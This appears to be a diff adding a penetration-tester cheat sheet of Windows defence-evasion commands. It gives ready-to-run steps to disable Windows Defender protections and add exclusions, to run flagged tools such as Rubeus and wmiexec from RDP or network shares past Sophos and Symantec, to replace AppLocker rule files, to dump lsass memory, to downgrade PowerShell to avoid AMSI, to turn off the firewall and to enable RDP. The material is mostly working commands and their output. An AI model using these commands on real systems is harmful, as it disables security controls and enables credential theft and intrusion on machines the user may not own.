@@ -1,0 +1,215 @@
+==================================================================================================================
+Protection bypass tricks
+==================================================================================================================
+
+
+==================================================================================================================
+1. Commands to disable and bypass Windows Defender AV 
+==================================================================================================================
+
+1.1 Commands to check if Windows Defender is enabled on a machine
+---------------------------------------------------------------------------------
+PS C:\Users\jeff> Get-MpComputerStatus | Select AntivirusEnabled
+
+AntivirusEnabled
+----------------
+            True
+
+PS C:\Users\jeff> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+PS C:\Users\jeff> Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL
+
+IsTamperProtected         : False
+RealTimeProtectionEnabled : True
+
+
+PS C:\Users\jeff> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+displayName              : Windows Defender
+instanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46
+                           }
+pathToSignedProductExe   : windowsdefender://
+pathToSignedReportingExe : %ProgramFiles%\Windows
+                           Defender\MsMpeng.exe
+productState             : 397568
+timestamp                : Mon, 22 Nov 2021 06:29:02 GMT
+PSComputerName           :
+
+
+1.2 Command to disable real time monitoring for Windows Defender
+---------------------------------------------------------------------------------
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
+
+Notes:
+- Needs to be run from an ELEVATED shell
+- A notification is shown to the user 
+- Event ID 5001 (Microsoft-Windows-Windows Defender/Operational) - Windows Defender Real-Time Protection was disabled.
+
+
+1.3 Command to avoid detection of in-memory download execute one liner
+---------------------------------------------------------------------------------
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+
+Notes:
+- Needs to be run from an ELEVATED shell
+- This command doesn't show any notification to the user and
+- Event ID 5004 (Microsoft-Windows-Windows Defender/Operational)  - Windows Defender Real-Time Protection feature (IE Downloads and Outlook Express attachments) configuration has changed.
+
+
+1.4 Command to add a path exclusion for Defender
+---------------------------------------------------------------------------------
+PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
+
+Note: Needs to be run from an ELEVATED shell
+
+
+==================================================================================================================
+2. Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
+==================================================================================================================
+
+Context: During an internal penetration test you are logged into a Windows server using RDP with a local admin account.
+         You tried to upload and execute an obfuscated 'hacking' tool such as rubeus (that you have modified and recompiled) but unfortunately it is
+         still detected and deleted by the antivirus solution.
+
+If you don't have the time to recompile your tool to avoid the AV detection you can simply run the tool 'remotely' from your local C: drive shared
+throuh the RDP session (i.e. \\tsclient\C\) or from a remote shared drive (i.e. \\servername\share-pentest\). 
+In most case, the AV won't block it and your executable will be run.
+
+
+Example 1 - Sophos Antivirus
+----------------------------------------------
+On a Windows Server protected by a Sophos AV, my recompiled version of Rubeus was flagged and deleted when I uploaded it, however it was not detected
+nor blocked when I ran it from my local C: drive shared throuh my RDP session.
+
+C:\temp > \\tsclient\C\Users\pentester\Documents\Tools\Rubeus.exe kerberoasting /aes /nowrap
+  ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Kerberoasting
+<SNIP>
+
+
+Example 2 - Symantec (EPP) Antivirus
+----------------------------------------------
+On a Windows Server protected by a Symantec (EPP) Antivirus, my recompiled/packed version of wmiexec.exe was detected and deleted when I uploaded it,
+however it was not detected nor blocked when I ran it from a remote shared drive.
+
+C:\> powershell -exec bypass
+PS C:\> cd \\servername\share-pentest\
+PS \\servername\share-pentest > wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:ad5f04d33d00db5f<SNIP> admin-user@<IP>
+Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+
+C:\>
+
+
+==================================================================================================================
+3. Commands to bypass/disable Applocker (with local admin priv)
+==================================================================================================================
+
+> Usefull inks:
+  - https://github.com/api0cradle/UltimateAppLockerByPassList
+  - https://github.com/api0cradle/AppLocker-Stuff
+
+> Example of how to bypass Applocker with a local admin account logged on a Windows 2016 server.
+
+Step 1. AppLocker is enabled
+-----------------------------------------------------------------------------------------------
+C:\Windows\System32\applocker>dir
+ Volume in drive C has no label.
+ Volume Serial Number is C2E5-D1EC
+
+ Directory of C:\Windows\System32\applocker
+
+04/19/2019  11:34 PM    <DIR>          .
+04/19/2019  11:34 PM    <DIR>          ..
+04/19/2019  11:34 PM                72 Appx.AppLocker
+04/19/2019  11:34 PM                72 Dll.AppLocker
+04/19/2019  11:34 PM               960 Exe.AppLocker
+04/19/2019  11:34 PM                72 Msi.AppLocker
+04/19/2019  11:34 PM             1,808 Script.AppLocker
+               5 File(s)          2,984 bytes
+               2 Dir(s)  13,920,964,608 bytes free
+
+C:\Windows\System32\applocker> type Exe.AppLocker
+ApPF          X            x  H   â•   Ã‡   â””    2   L  8   Â¼     Ã¤  (        Ã‡                                     Ã“ Ã¡           artxÂ°   A P P I D : / / F Q B N Ã§Â°   A P P I D : / / F Q B N PÃ¤   t   O = M I C R O S O F T   C O R P O R A T I O N ,   L = R E D M O N D ,   S = W A S H I N G T O N ,   C = U S \ * \ *         Ã Ã¡     Ã¡             5 a 9 3 4 0 f 3 - f 6 a 7 - 4 8 9 2 - 8 4 a c - 0 f f f d 5 1 d 9 5 8 4 D : ( X A ; ; F X ; ; ; S - 1 - 1 - 0 ; ( ( E x i s t s   A P P I D : / / F Q B N )   & &   ( ( A P P I D : / / F Q B N )   > =   ( { " O = M I C R O S O F T   C O R P O R A T I O N ,   L = R E D M O N D ,   S = W A S H I N G T O N ,   C = U S \ * \ * " , 0 } ) ) ) ) S i g n e d   b y   O = M I C R O S O F T   C O R P O R A T I O N ,   L = R E D M O N D ,   S = W A S H I N G T O N ,   C = U S A p p l o c k e r   P r i v a t e \ L o w B o x   A C E ( A ; ; F X ; ; ; S - 1 - 1 5 - 2 - 1 ) L o w B o x   A C E
+C:\Windows\System32\applocker>
+
+Step 2. Delete and replace a modified Applocker EXE file rule "Exe.AppLocker"
+-----------------------------------------------------------------------------------------------
+> Note: https://github.com/api0cradle/AppLocker-Stuff
+
+C:\Windows\System32\applocker> del Exe.AppLocker
+C:\Windows\System32\applocker> put Exe.AppLocker
+
+Step 3. Restart the server - The new AppLocker rule will be valid until a "GPO /update" is done
+-----------------------------------------------------------------------------------------------
+C:\Windows\System32\applocker> shutdown /r
+
+Step 4. Now we can execute any executable file
+-----------------------------------------------------------------------------------------------
+C:\Temp> procdump.exe -accepteula -ma lsass.exe memorydump.dmp
+
+
+==================================================================================================================
+4. Commands How to enable Windows PowerShell 2.0 in Windows 10 (it requires administrative privileges)
+====================================================================================================================
+
+Since there is no AMSI in PowerShell v2.0 it is interesting to use it when possible. 
+If .Net 3.0 is available on a target Windows 10 machine - which is not by default - PowerShell v2 can be started  with the -Version option.
+
+To disable/enable Windows PowerShell 2.0, copy and paste the command below into an elevated PowerShell prompt, and press enter
+-------------------------------------------------------------------------------------------------------------------------------
+PS C:\> Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
+
+OR copy and paste the command below into an elevated command prompt, and press enter
+-------------------------------------------------------------------------------------
+C:\> Dism /online /Enable-Feature /FeatureName:"MicrosoftWindowsPowerShellV2Root" -All
+
+
+==================================================================================================================
+5. Commands to disable/enable the Windows Firewall 
+==================================================================================================================
+
+To turn OFF/ON the firewall for all 3 'networks'
+-------------------------------------------------
+C:\> netsh advfirewall set allprofiles state off
+C:\> netsh advfirewall set allprofiles state on
+
+Start / Stop firewall service
+-----------------------------
+C:\> netsh firewall set opmode DISABLE
+C:\> netsh firewall set opmode ENABLE
+
+Allow/Deny Ports
+-----------------
+netsh firewall add portopening TCP _port_number_ _name_ DISABLE ALL
+netsh firewall add portopening TCP 3264 CCMAIL DISABLE ALL
+
+netsh firewall add portopening TCP _port_number_ _name_ ENABLE ALL
+netsh firewall add portopening TCP 8443 PLESK-ADMIN ENABLE ALL
+
+
+==================================================================================================================
+6. Commands to enable RDP Access on a Windows machine
+==================================================================================================================
+C:\> reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+
+C:\> netsh firewall set service remoteadmin enable
+
+C:\> netsh firewall set service remotedesktop enable
+
